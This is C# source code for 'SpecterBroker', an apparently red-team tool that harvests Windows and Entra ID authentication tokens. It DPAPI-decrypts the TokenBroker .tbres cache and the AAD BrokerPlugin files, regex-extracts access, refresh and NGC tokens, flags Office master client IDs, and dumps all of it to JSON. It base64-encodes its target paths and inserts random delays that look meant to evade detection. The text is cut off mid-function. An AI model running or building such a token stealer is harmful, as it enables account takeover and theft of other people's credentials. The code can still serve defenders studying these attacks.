using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.Formats.Asn1;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Text.RegularExpressions;
using System.Threading;

namespace SpecterBroker
{
    internal class Program
    {
        static Random rng = new Random();
        static string AppDataPath = Environment.GetEnvironmentVariable("LOCALAPPDATA");
        static string PublisherId = GetPublisherId(DS("Q049TWljcm9zb2Z0IFdpbmRvd3MsIE89TWljcm9zb2Z0IENvcnBvcmF0aW9uLCBMPVJlZG1vbmQsIFM9V2FzaGluZ3RvbiwgQz1VUw=="));
        static string AADBrokerPluginPath = Path.Combine(AppDataPath, DS("UGFja2FnZXM="), DS("TWljcm9zb2Z0") + ".AAD." + DS("QnJva2VyUGx1Z2lu") + "_" + PublisherId);
        static string AADBrokerPluginLocalState = Path.Combine(AADBrokerPluginPath, DS("TG9jYWxTdGF0ZQ=="));
        static string Hostname = Environment.MachineName;
        static string Username = Environment.UserName;

        static string DS(string b64) => Encoding.UTF8.GetString(Convert.FromBase64String(b64));

        static byte HEADER_JSON = 0x13;

        // Office Master AppIDs
        private static readonly string[] OFFICE_MASTER_APPIDS = {
            "d3590ed6-52b3-4102-aeff-aad2292ab01c",
            "d3590ed6-52b1-4102-aeff-aad2292ab01c"
        };

        // Regex patterns for token extraction
        static readonly Regex JwtPattern = new Regex(
            @"(eyJ[A-Za-z0-9_\-]{20,}\.eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]*)", 
            RegexOptions.Compiled);
        
        // Microsoft Refresh Token v1 format pattern
        static readonly Regex RefreshTokenPattern = new Regex(
            @"(1\.A[A-Za-z0-9][A-Za-z0-9_\-.]{200,})", 
            RegexOptions.Compiled);
        
        // NGC token pattern with full header
        static readonly Regex NgcTokenPattern = new Regex(
            @"(AQAAAAEAAAABAAAA[A-Za-z0-9+/=]{50,})", 
            RegexOptions.Compiled);
        
        static readonly Regex GuidPattern = new Regex(
            @"([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})", 
            RegexOptions.IgnoreCase | RegexOptions.Compiled);
        static readonly Regex EmailPattern = new Regex(
            @"([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})", 
            RegexOptions.Compiled);

        #region Data Structures - TBRes Format

        internal struct CngBlobAsn1
        {
            public byte[] EncryptedCEK;
            public byte[] EncryptedContent;
            public byte[] Iv;
            public byte[] Kek;
        }

        /// <summary>
        /// Token output for TBRes format (compatible with Invoke-TBResExtraction.ps1)
        /// </summary>
        internal class TBResTokenOutput
        {
            [JsonPropertyName("source_file")]
            public string SourceFile { get; set; }

            [JsonPropertyName("access_token")]
            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
            public string AccessToken { get; set; }

            [JsonPropertyName("id_token")]
            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
            public string IdToken { get; set; }

            [JsonPropertyName("refresh_token")]
            public string RefreshToken { get; set; } // Always include, even if null

            [JsonPropertyName("client_id")]
            public string ClientId { get; set; }

            [JsonPropertyName("upn")]
            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
            public string Upn { get; set; }

            [JsonPropertyName("scope")]
            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
            public string Scope { get; set; }

            [JsonPropertyName("tenant_id")]
            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
            public string TenantId { get; set; }

            [JsonPropertyName("extracted_from")]
            public string ExtractedFrom { get; set; }

            [JsonPropertyName("extracted_at")]
            public string ExtractedAt { get; set; }
        }

        /// <summary>
        /// TBRes output wrapper (compatible with Invoke-TBResExtraction.ps1)
        /// </summary>
        internal class TBResOutputWrapper
        {
            [JsonPropertyName("target")]
            public string Target { get; set; }

            [JsonPropertyName("extraction_time")]
            public string ExtractionTime { get; set; }

            [JsonPropertyName("working_directory")]
            public string WorkingDirectory { get; set; }

            [JsonPropertyName("files_processed")]
            public int FilesProcessed { get; set; }

            [JsonPropertyName("tokens_extracted")]
            public int TokensExtracted { get; set; }

            [JsonPropertyName("tokens_skipped_expired")]
            public int TokensSkippedExpired { get; set; }

            [JsonPropertyName("has_office_master_token")]
            public bool HasOfficeMasterToken { get; set; }

            [JsonPropertyName("tokens")]
            public List<TBResTokenOutput> Tokens { get; set; }
        }

        #endregion

        #region Data Structures - BrokerDecrypt Format

        /// <summary>
        /// Token output for BrokerDecrypt format (compatible with Invoke-BrokerDecrypt.ps1)
        /// </summary>
        internal class BrokerTokenOutput
        {
            [JsonPropertyName("type")]
            public string Type { get; set; }

            [JsonPropertyName("token")]
            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
            public string Token { get; set; }

            [JsonPropertyName("access_token")]
            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
            public string AccessToken { get; set; }

            [JsonPropertyName("cache_path")]
            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
            public string CachePath { get; set; }

            [JsonPropertyName("client_id")]
            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
            public string ClientId { get; set; }

            [JsonPropertyName("login_url")]
            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
            public string LoginUrl { get; set; }

            [JsonPropertyName("email")]
            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
            public string Email { get; set; }

            [JsonPropertyName("tenant_id")]
            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
            public string TenantId { get; set; }

            [JsonPropertyName("user_oid")]
            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
            public string UserOid { get; set; }

            [JsonPropertyName("display_name")]
            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
            public string DisplayName { get; set; }

            [JsonPropertyName("scope")]
            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
            public string Scope { get; set; }

            [JsonPropertyName("expires_at")]
            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
            public string ExpiresAt { get; set; }

            [JsonPropertyName("session_key")]
            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
            public string SessionKey { get; set; }

            // ============================================================
            // NEW FIELDS: Enhanced Refresh Token metadata
            // ============================================================
            [JsonPropertyName("source_type")]
            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
            public string SourceType { get; set; }

            [JsonPropertyName("is_prt_bound")]
            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
            public bool? IsPrtBound { get; set; }

            [JsonPropertyName("token_type")]
            [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
            public string TokenType { get; set; }
        }

        /// <summary>
        /// BrokerDecrypt metadata
        /// </summary>
        internal class BrokerMetadata
        {
            [JsonPropertyName("timestamp")]
            public string Timestamp { get; set; }

            [JsonPropertyName("hostname")]
            public string Hostname { get; set; }

            [JsonPropertyName("username")]
            public string Username { get; set; }

            [JsonPropertyName("extraction_method")]
            public string ExtractionMethod { get; set; }

            [JsonPropertyName("target_computer")]
            public string TargetComputer { get; set; }
        }

        /// <summary>
        /// BrokerDecrypt statistics
        /// </summary>
        internal class BrokerStatistics
        {
            [JsonPropertyName("total_tokens")]
            public int TotalTokens { get; set; }

            [JsonPropertyName("access_tokens")]
            public int AccessTokens { get; set; }

            [JsonPropertyName("refresh_tokens")]
            public int RefreshTokens { get; set; }

            [JsonPropertyName("ngc_tokens")]
            public int NgcTokens { get; set; }
        }

        /// <summary>
        /// BrokerDecrypt output wrapper (compatible with Invoke-BrokerDecrypt.ps1)
        /// </summary>
        internal class BrokerOutputWrapper
        {
            [JsonPropertyName("metadata")]
            public BrokerMetadata Metadata { get; set; }

            [JsonPropertyName("tokens")]
            public List<BrokerTokenOutput> Tokens { get; set; }

            [JsonPropertyName("statistics")]
            public BrokerStatistics Statistics { get; set; }
        }

        #endregion

        #region Internal Token Structure

        /// <summary>
        /// Internal token structure for processing
        /// </summary>
        internal class InternalToken
        {
            public string SourceType { get; set; }
            public string SourceFile { get; set; }
            public string AccessToken { get; set; }
            public string IdToken { get; set; }
            public string RefreshToken { get; set; }
            public string NgcToken { get; set; }
            public string ClientId { get; set; }
            public string Upn { get; set; }
            public string TenantId { get; set; }
            public string Scope { get; set; }
            public string ExpiresAt { get; set; }
            public bool IsExpired { get; set; }
            public string ExtractedAt { get; set; }
            public string ExtractedFrom { get; set; }
            public string CachePath { get; set; }
            public string DisplayName { get; set; }
            public string UserOid { get; set; }
            public string SessionKey { get; set; }
        }

        #endregion

        #region Main Entry Point

        static void Main(string[] args)
        {
            Console.WriteLine("═══════════════════════════════════════════════════════════════");
            Console.WriteLine(" ▓▒░ 01010011 01010000 01000101 01000011 01010100 01000101 01010010 ░▒▓");
            Console.WriteLine("═══════════════════════════════════════════════════════════════\n");
            Console.WriteLine("  ███████╗██████╗ ███████╗ ██████╗████████╗███████╗██████╗ ");
            Console.WriteLine("  ██╔════╝██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗");
            Console.WriteLine("  ███████╗██████╔╝█████╗  ██║        ██║   █████╗  ██████╔╝");
            Console.WriteLine("  ╚════██║██╔═══╝ ██╔══╝  ██║        ██║   ██╔══╝  ██╔══██╗");
            Console.WriteLine("  ███████║██║     ███████╗╚██████╗   ██║   ███████╗██║  ██║");
            Console.WriteLine("  ╚══════╝╚═╝     ╚══════╝ ╚═════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝\n");
            Console.WriteLine("  ██████╗ ██████╗  ██████╗ ██╗  ██╗███████╗██████╗ ");
            Console.WriteLine("  ██╔══██╗██╔══██╗██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗");
            Console.WriteLine("  ██████╔╝██████╔╝██║   ██║█████╔╝ █████╗  ██████╔╝");
            Console.WriteLine("  ██╔══██╗██╔══██╗██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗");
            Console.WriteLine("  ██████╔╝██║  ██║╚██████╔╝██║  ██╗███████╗██║  ██║");
            Console.WriteLine("  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n");
            Console.WriteLine("  [+] Windows Auth Token Decryptor v.1.1");
            Console.WriteLine("  [+] by r3alm0m1x82 - safebreach.it");
            Console.WriteLine("  [*] DPAPI | TBRes | WAM | NGC | FOCI\n");
            Console.WriteLine(" ▓▒░ 01000010 01010010 01001111 01001011 01000101 01010010 01001111 ░▒▓");
            Console.WriteLine("═══════════════════════════════════════════════════════════════\n");

            var tbresTokens = new List<InternalToken>();
            var wamTokens = new List<InternalToken>();
            string extractedAt = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
            int tbresFilesProcessed = 0;
            int wamFilesProcessed = 0;
            int tbresExpiredSkipped = 0;
            int wamExpiredSkipped = 0;

            Thread.Sleep(rng.Next(100, 300));

            // 1. Processing cache type 1
            Console.WriteLine("[*] Processing cache type 1...");
            string tbresPath = Path.Combine(AppDataPath, DS("TWljcm9zb2Z0"), DS("VG9rZW5Ccm9rZXI="), DS("Q2FjaGU="));
            Console.WriteLine($"[*] Path: {tbresPath}");
            
            tbresTokens = ProcessCacheDataType1(tbresPath, extractedAt, out tbresFilesProcessed, out tbresExpiredSkipped);
            Console.WriteLine($"[+] Found {tbresTokens.Count} entries from {tbresFilesProcessed} files\n");

            Thread.Sleep(rng.Next(150, 400));

            // 2. Processing cache type 2
            Console.WriteLine("[*] Processing cache type 2...");
            Console.WriteLine($"[*] Path: {AADBrokerPluginLocalState}");

            if (Directory.Exists(AADBrokerPluginLocalState))
            {
                wamTokens = ProcessCacheDataType2(extractedAt, out wamFilesProcessed, out wamExpiredSkipped);
                Console.WriteLine($"[+] Found {wamTokens.Count} entries from {wamFilesProcessed} files\n");
            }
            else
            {
                Console.WriteLine("[-] Cache directory not found\n");
            }

            Thread.Sleep(rng.Next(100, 250));

            // 3. Output results
            Console.WriteLine("===========================================");
            Console.WriteLine($"[+] TOTAL DATA EXTRACTED:");
            Console.WriteLine($"    Type 1: {tbresTokens.Count} entries");
            Console.WriteLine($"    Type 2: {wamTokens.Count} entries");
            Console.WriteLine("===========================================\n");

            // Categorize WAM tokens
            var wamAccessTokens = wamTokens.Where(t => !string.IsNullOrEmpty(t.AccessToken)).ToList();
            var wamRefreshTokens = wamTokens.Where(t => !string.IsNullOrEmpty(t.RefreshToken)).ToList();
            var wamNgcTokens = wamTokens.Where(t => !string.IsNullOrEmpty(t.NgcToken)).ToList();

            Console.WriteLine($"[*] Type 2 Access Data: {wamAccessTokens.Count}");
            Console.WriteLine($"[*] Type 2 Refresh Data: {wamRefreshTokens.Count}");
            Console.WriteLine($"[*] Type 2 NGC Data: {wamNgcTokens.Count}");
            Console.WriteLine($"[*] Type 1 Data: {tbresTokens.Count}");
            Console.WriteLine($"[*] Expired skipped: {tbresExpiredSkipped + wamExpiredSkipped}\n");

            // Check for Office Master Token
            bool hasOfficeMaster = tbresTokens.Any(t => OFFICE_MASTER_APPIDS.Contains(t.ClientId)) ||
                                   wamTokens.Any(t => OFFICE_MASTER_APPIDS.Contains(t.ClientId));

            if (hasOfficeMaster)
            {
                Console.WriteLine("###############################################");
                Console.WriteLine("###   *** OFFICE MASTER DATA FOUND! ***   ###");
                Console.WriteLine("###############################################\n");
            }

            string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
            var jsonOptions = new JsonSerializerOptions
            {
                WriteIndented = true,
                DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull
            };

            Thread.Sleep(rng.Next(100, 200));

            // ============================================================
            // OUTPUT FILE 1: Type 1 format (cache_export_type1_xxx.json)
            // ============================================================
            if (tbresTokens.Count > 0)
            {
                var tbresOutput = new TBResOutputWrapper
                {
                    Target = Hostname,
                    ExtractionTime = extractedAt,
                    WorkingDirectory = Environment.CurrentDirectory,
                    FilesProcessed = tbresFilesProcessed,
                    TokensExtracted = tbresTokens.Count,
                    TokensSkippedExpired = tbresExpiredSkipped,
                    HasOfficeMasterToken = tbresTokens.Any(t => OFFICE_MASTER_APPIDS.Contains(t.ClientId)),
                    Tokens = tbresTokens.Select(t => new TBResTokenOutput
                    {
                        SourceFile = t.SourceFile,
                        AccessToken = t.AccessToken,
                        IdToken = t.IdToken,
                        RefreshToken = null, // TBRes files don't contain RT
                        ClientId = t.ClientId,
                        Upn = t.Upn,
                        Scope = t.Scope,
                        TenantId = t.TenantId,
                        ExtractedFrom = t.ExtractedFrom,
                        ExtractedAt = t.ExtractedAt
                    }).ToList()
                };

                string tbresFile = $"cache_export_type1_{timestamp}.json";
                string tbresJson = JsonSerializer.Serialize(tbresOutput, jsonOptions);
                File.WriteAllText(tbresFile, tbresJson);
                Console.WriteLine($"[+] Type 1 data saved to: {tbresFile}");
            }

            Thread.Sleep(rng.Next(100, 200));

            // ============================================================
            // OUTPUT FILE 2: Type 2 format (cache_export_type2_xxx.json)
            // ENHANCED: Added source_type, is_prt_bound, token_type for Refresh Tokens
            // ============================================================
            if (wamTokens.Count > 0)
            {
                var brokerTokens = new List<BrokerTokenOutput>();

                // ============================================================
                // Add Refresh Tokens with ENHANCED metadata
                // ============================================================
                foreach (var rt in wamRefreshTokens)
                {
                    // Determine source type from file name
                    string fileName = Path.GetFileName(rt.CachePath ?? "").ToLower();
                    string sourceType = fileName.StartsWith("p_") ? "PRT_FILE" : 
                                        fileName.StartsWith("a_") ? "AUTHORITY_FILE" : 
                                        "UNKNOWN";
                    bool isPrtBound = sourceType == "PRT_FILE";

                    brokerTokens.Add(new BrokerTokenOutput
                    {
                        Type = "refresh_token",
                        Token = rt.RefreshToken,
                        CachePath = rt.CachePath,
                        ClientId = rt.ClientId,
                        LoginUrl = !string.IsNullOrEmpty(rt.TenantId) 
                            ? $"https://login.microsoftonline.com/{rt.TenantId}" 
                            : null,
                        // JWT-derived metadata (populated from Access Tokens in same file)
                        Email = rt.Upn,
                        TenantId = rt.TenantId,
                        UserOid = rt.UserOid,
                        DisplayName = rt.DisplayName,
                        // NEW FIELDS
                        SourceType = sourceType,
                        IsPrtBound = isPrtBound,
                        TokenType = "refresh"
                    });
                }

                // Add NGC Tokens
                foreach (var ngc in wamNgcTokens)
                {
                    brokerTokens.Add(new BrokerTokenOutput
                    {
                        Type = "ngc_token",
                        Token = ngc.NgcToken,
                        CachePath = ngc.CachePath
                    });
                }

                // Add Access Tokens
                foreach (var at in wamAccessTokens)
                {
                    brokerTokens.Add(new BrokerTokenOutput
                    {
                        Type = "access_token",
                        AccessToken = at.AccessToken,
                        CachePath = at.CachePath,
                        ClientId = at.ClientId,
                        Email = at.Upn,
                        TenantId = at.TenantId,
                        UserOid = at.UserOid,
                        DisplayName = at.DisplayName,
                        Scope = at.Scope,
                        ExpiresAt = at.ExpiresAt,
                        SessionKey = at.SessionKey,
                        LoginUrl = !string.IsNullOrEmpty(at.TenantId)
                            ? $"https://login.microsoftonline.com/{at.TenantId}"
                            : null
                    });
                }

                var brokerOutput = new BrokerOutputWrapper
                {
                    Metadata = new BrokerMetadata
                    {
                        Timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ"),
                        Hostname = Hostname,
                        Username = Username,
                        ExtractionMethod = "CacheProcessor",
                        TargetComputer = Hostname
                    },
                    Tokens = brokerTokens,
                    Statistics = new BrokerStatistics
                    {
                        TotalTokens = wamTokens.Count,
                        AccessTokens = wamAccessTokens.Count,
                        RefreshTokens = wamRefreshTokens.Count,
                        NgcTokens = wamNgcTokens.Count
                    }
                };

                string wamFile = $"cache_export_type2_{timestamp}.json";
                string wamJson = JsonSerializer.Serialize(brokerOutput, jsonOptions);
                File.WriteAllText(wamFile, wamJson);
                Console.WriteLine($"[+] Type 2 data saved to: {wamFile}");
            }

            // Print summary
            Console.WriteLine("\n[*] Data Summary:");
            
            foreach (var token in tbresTokens.Take(10))
            {
                Console.WriteLine($"    [type1] {token.SourceFile}");
                if (!string.IsNullOrEmpty(token.Upn))
                    Console.WriteLine($"        UPN: {token.Upn}");
                if (!string.IsNullOrEmpty(token.ClientId))
                    Console.WriteLine($"        ClientId: {token.ClientId}");
                if (OFFICE_MASTER_APPIDS.Contains(token.ClientId))
                    Console.WriteLine($"        [***] OFFICE MASTER DATA!");
            }

            foreach (var token in wamRefreshTokens.Take(5))
            {
                Console.WriteLine($"    [RT] {token.SourceFile}");
                Console.WriteLine($"        Token: {token.RefreshToken.Substring(0, Math.Min(50, token.RefreshToken.Length))}...");
            }

            foreach (var token in wamNgcTokens.Take(5))
            {
                Console.WriteLine($"    [NGC] {token.SourceFile}");
                Console.WriteLine($"        Token: {token.NgcToken.Substring(0, Math.Min(50, token.NgcToken.Length))}...");
            }

            int remaining = tbresTokens.Count + wamTokens.Count - 20;
            if (remaining > 0)
                Console.WriteLine($"    ... and {remaining} more tokens");

            Console.WriteLine("\n[*] Done.");
        }

        #endregion

        #region TBRes Cache Extraction

        static List<InternalToken> ProcessCacheDataType1(string tbresPath, string extractedAt, out int filesProcessed, out int expiredSkipped)
        {
            var tokens = new List<InternalToken>();
            filesProcessed = 0;
            expiredSkipped = 0;

            if (!Directory.Exists(tbresPath))
            {
                Console.WriteLine($"    [!] Directory not found: {tbresPath}");
                return tokens;
            }

            var tbresFiles = Directory.GetFiles(tbresPath, "*.tbres");
            Console.WriteLine($"    [*] Found {tbresFiles.Length} .tbres files");

            foreach (var file in tbresFiles)
            {
                Thread.Sleep(rng.Next(50, 150));
                filesProcessed++;
                string fileName = Path.GetFileName(file);

                try
                {
                    // Read file content - TBRES files are Unicode (UTF-16LE)
                    byte[] fileBytes = File.ReadAllBytes(file);
                    string fileContent = Encoding.Unicode.GetString(fileBytes);

                    // Fallback to UTF-8 if not valid TBDataStoreObject
                    if (string.IsNullOrEmpty(fileContent) || !fileContent.Contains("TBDataStoreObject"))
                    {
                        fileContent = Encoding.UTF8.GetString(fileBytes);
                    }

                    // Clean up BOM and trailing chars
                    fileContent = fileContent.TrimStart('\uFEFF').TrimEnd('\0', '\r', '\n', ' ');

                    // Extract and decrypt ResponseBytes.Value from cache
                    var token = DecryptCacheResponse(file, fileContent, extractedAt);
                    if (token != null)
                    {
                        if (token.IsExpired)
                        {
                            expiredSkipped++;
                            continue;
                        }
                        tokens.Add(token);
                        Console.WriteLine($"    [+] Decrypted: {fileName}");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"    [-] Error: {fileName} - {ex.Message}");
                }
            }

            return tokens;
        }

        static InternalToken DecryptCacheResponse(string filePath, string fileContent, string extractedAt)
        {
            string fileName = Path.GetFileName(filePath);

            // Find ResponseBytes section
            int responseBytesIndex = fileContent.IndexOf("\"ResponseBytes\"");
            if (responseBytesIndex == -1)
                responseBytesIndex = fileContent.IndexOf("ResponseBytes");

            if (responseBytesIndex == -1)
            {
                return TryAlternativeCacheDecrypt(filePath, fileContent, extractedAt);
            }

            // Find Value field after ResponseBytes
            string afterResponseBytes = fileContent.Substring(responseBytesIndex);
            
            // Look for "Value":" pattern
            int valueIndex = afterResponseBytes.IndexOf("\"Value\":\"");
            if (valueIndex == -1)
                valueIndex = afterResponseBytes.IndexOf("Value\":\"");
            if (valueIndex == -1)
                valueIndex = afterResponseBytes.IndexOf("\"Value\": \"");

            if (valueIndex == -1)
                return TryAlternativeCacheDecrypt(filePath, fileContent, extractedAt);

            // Extract base64 value
            int startQuote = afterResponseBytes.IndexOf('"', valueIndex + 7);
            if (startQuote == -1)
                return TryAlternativeCacheDecrypt(filePath, fileContent, extractedAt);

            int endQuote = afterResponseBytes.IndexOf('"', startQuote + 1);
            if (endQuote == -1)
                return TryAlternativeCacheDecrypt(filePath, fileContent, extractedAt);

            string base64Value = afterResponseBytes.Substring(startQuote + 1, endQuote - startQuote - 1);

            if (string.IsNullOrEmpty(base64Value) || base64Value.Length < 100)
                return TryAlternativeCacheDecrypt(filePath, fileContent, extractedAt);

            try
            {
                // Decode and decrypt with DPAPI
                byte[] encrypted = Convert.FromBase64String(base64Value);
                byte[] decrypted = ProtectedData.Unprotect(encrypted, null, DataProtectionScope.CurrentUser);
                string decryptedText = Encoding.UTF8.GetString(decrypted);

                return ParseDecryptedContent(fileName, decryptedText, "tbres", extractedAt, filePath);
            }
            catch
            {
                return TryAlternativeCacheDecrypt(filePath, fileContent, extractedAt);
            }
        }

        static InternalToken TryAlternativeCacheDecrypt(string filePath, string fileContent, string extractedAt)
        {
            // Try to find any large base64 blob and decrypt it
            var base64Match = Regex.Match(fileContent, @"([A-Za-z0-9+/=]{500,})");
            if (!base64Match.Success)
                return null;

            try
            {
                byte[] encrypted = Convert.FromBase64String(base64Match.Groups[1].Value);
                byte[] decrypted = ProtectedData.Unprotect(encrypted, null, DataProtectionScope.CurrentUser);
                string text = Encoding.UTF8.GetString(decrypted);
                return ParseDecryptedContent(Path.GetFileName(filePath), text, "tbres", extractedAt, filePath);
            }
            catch
            {
                return null;
            }
        }

        #endregion

        #region WAM Extraction

        static List<InternalToken> ProcessCacheDataType2(string extractedAt, out int filesProcessed, out int expiredSkipped)
        {
            var tokens = new List<InternalToken>();
            var processedTokens = new HashSet<string>();
            filesProcessed = 0;
            expiredSkipped = 0;

            var allFiles = GetAllFilesRecursive(AADBrokerPluginLocalState);
            Console.WriteLine($"    [*] Found {allFiles.Count} total files in LocalState");

            foreach (var file in allFiles)
            {
                Thread.Sleep(rng.Next(30, 100));
                string fileName = Path.GetFileName(file).ToLower();
                
                // Process p_ and a_ files, or .def files
                if (!fileName.EndsWith(".def") && !fileName.StartsWith("p_") && !fileName.StartsWith("a_"))
                    continue;

                filesProcessed++;

                try
                {
                    byte[] processedData = ProcessWAMFile(file);
                    if (processedData == null || processedData.Length == 0)
                        continue;

                    string rawData = ExtractRawData(processedData);
                    if (string.IsNullOrEmpty(rawData))
                        continue;

                    // Extract ALL token types
                    var fileTokens = ExtractAllDataTypes(file, rawData, extractedAt);
                    
                    foreach (var token in fileTokens)
                    {
                        // Intelligent deduplication by token type
                        string dedupKey;
                        if (!string.IsNullOrEmpty(token.NgcToken))
                        {
                            // NGC tokens: deduplicate on full token value
                            dedupKey = $"NGC:{token.NgcToken}";
                        }
                        else
                        {
                            string key = token.AccessToken ?? token.RefreshToken ?? "";
                            if (!string.IsNullOrEmpty(key))
                            {
                                // Use 200 chars for dedup to avoid false positives
                                dedupKey = key.Length > 200 ? key.Substring(0, 200) : key;
                            }
                            else
                            {
                                continue; // Skip empty tokens
                            }
                        }

                        if (processedTokens.Contains(dedupKey))
                            continue;
                        processedTokens.Add(dedupKey);

                        // Skip expired access tokens
                        if (!string.IsNullOrEmpty(token.AccessToken) && token.IsExpired)
                        {
                            expiredSkipped++;
                            continue;
                        }

                        tokens.Add(token);
                        
                        string tokenType = !string.IsNullOrEmpty(token.RefreshToken) ? "RT" :
                                         !string.IsNullOrEmpty(token.NgcToken) ? "NGC" : "AT";
                        Console.WriteLine($"    [+] {tokenType}: {Path.GetFileName(file)}");
                    }
                }
                catch (Exception ex)
                {
                    if (ex is CryptographicException)
                        continue;
                    // Silent fail for other errors
                }
            }

            return tokens;
        }

        static List<InternalToken> ExtractAllDataTypes(string filePath, string rawData, string extractedAt)
        {
            var tokens = new List<InternalToken>();
            string fileName = Path.GetFileName(filePath);

            // 1. Extract Refresh Tokens FIRST
            var rtMatches = RefreshTokenPattern.Matches(rawData);
            foreach (Match match in rtMatches)
            {
                string rt = match.Groups[1].Value;
                if (rt.Length > 200)
                {
                    var rtToken = new InternalToken
                    {
                        SourceType = "refresh_token",
                        SourceFile = fileName,
                        RefreshToken = rt,
                        ExtractedAt = extractedAt,
                        ExtractedFrom = Hostname,
                        CachePath = filePath,
                        IsExpired = false
                    };
                    // Extract metadata from refresh token structure
                    ExtractMetadataFromRefreshToken(rt, rtToken);
                    // Fallback to raw data for other metadata
                    ExtractMetadataFromRaw(rawData, rtToken);
                    tokens.Add(rtToken);
                }
            }

            // 2. Extract NGC Tokens
            var ngcMatches = NgcTokenPattern.Matches(rawData);
            foreach (Match match in ngcMatches)
            {
                string ngc = match.Groups[1].Value;
                if (ngc.Length > 50)
                {
                    var ngcToken = new InternalToken
                    {
                        SourceType = "ngc_token",
                        SourceFile = fileName,
                        NgcToken = ngc,
                        ExtractedAt = extractedAt,
                        ExtractedFrom = Hostname,
                        CachePath = filePath,
                        IsExpired = false
                    };
                    ExtractMetadataFromRaw(rawData, ngcToken);
                    tokens.Add(ngcToken);
                }
            }

            // Extract Access Tokens (JWT) - each JWT becomes a separate token entry
            var jwtMatches = JwtPattern.Matches(rawData);
            var jwts = jwtMatches.Cast<Match>().Select(m => m.Groups[1].Value).Distinct().ToList();

            foreach (var jwt in jwts)
            {
                try
                {
                    var parts = jwt.Split('.');
                    if (parts.Length < 2)
                        continue;

                    string header = Encoding.UTF8.GetString(Base64UrlDecode(parts[0]));
                    bool isIdToken = header.Contains("\"none\"") || header.Contains("\"alg\":\"none\"");

                    // Create separate token entry for each JWT
                    var atToken = new InternalToken
                    {
                        SourceType = "wam-at",
                        SourceFile = fileName,
                        ExtractedAt = extractedAt,
                        ExtractedFrom = Hostname,
                        CachePath = filePath
                    };

                    if (isIdToken)
                    {
                        atToken.IdToken = jwt;
                    }
                    else
                    {
                        atToken.AccessToken = jwt;
                    }

                    // Parse JWT per metadati
                    ParseJWTIntoToken(jwt, atToken);
                    
                    // Extract remaining metadata from raw data
                    ExtractMetadataFromRaw(rawData, atToken);

                    // Add only if valid access token is present (not ID token alone)
                    if (!string.IsNullOrEmpty(atToken.AccessToken))
                    {
                        tokens.Add(atToken);
                    }
                }
                catch
                {
                    // Skip invalid JWTs
                }
            }

            // ============================================================
            // ENHANCEMENT: Enrich Refresh Tokens with JWT metadata from Access Tokens
            // This populates email, display_name, user_oid, tenant_id in Refresh Tokens
            // ============================================================
            foreach (var rt in tokens.Where(t => t.SourceType == "refresh_token"))
            {
                // Find first Access Token from same file with JWT metadata
                var at = tokens.FirstOrDefault(t => 
                    t.SourceType == "wam-at" && 
                    !string.IsNullOrEmpty(t.AccessToken) &&
                    !string.IsNullOrEmpty(t.Upn));
                
                if (at != null)
                {
                    // Copy JWT metadata to RT if not already present
                    if (string.IsNullOrEmpty(rt.Upn))
                        rt.Upn = at.Upn;
                    if (string.IsNullOrEmpty(rt.DisplayName))
                        rt.DisplayName = at.DisplayName;
                    if (string.IsNullOrEmpty(rt.UserOid))
                        rt.UserOid = at.UserOid;
                    if (string.IsNullOrEmpty(rt.ClientId))
                        rt.ClientId = at.ClientId;
                    // Don't overwrite tenant_id if already extracted from RT itself
                    if (string.IsNullOrEmpty(rt.TenantId))
                        rt.TenantId = at.TenantId;
                }
            }

            return tokens;
        }

        static void ExtractMetadataFromRaw(string rawData, InternalToken token)
        {
            // Extract email/UPN
            if (string.IsNullOrEmpty(token.Upn))
            {
                var emailMatch = EmailPattern.Match(rawData);
                if (emailMatch.Success)
                    token.Upn = emailMatch.Groups[1].Value;
            }

            // Extract GUIDs - but DON'T overwrite client_id if already set from JWT!
            var guids = GuidPattern.Matches(rawData)
                .Cast<Match>()
                .Select(m => m.Groups[1].Value.ToLower())
                .Distinct()
                .ToList();

            // Only set client_id if not already set (from JWT parsing)
            if (string.IsNullOrEmpty(token.ClientId) && guids.Count > 0)
                token.ClientId = guids[0];
            
            // Set tenant_id from second GUID if not set
            if (string.IsNullOrEmpty(token.TenantId) && guids.Count > 1)
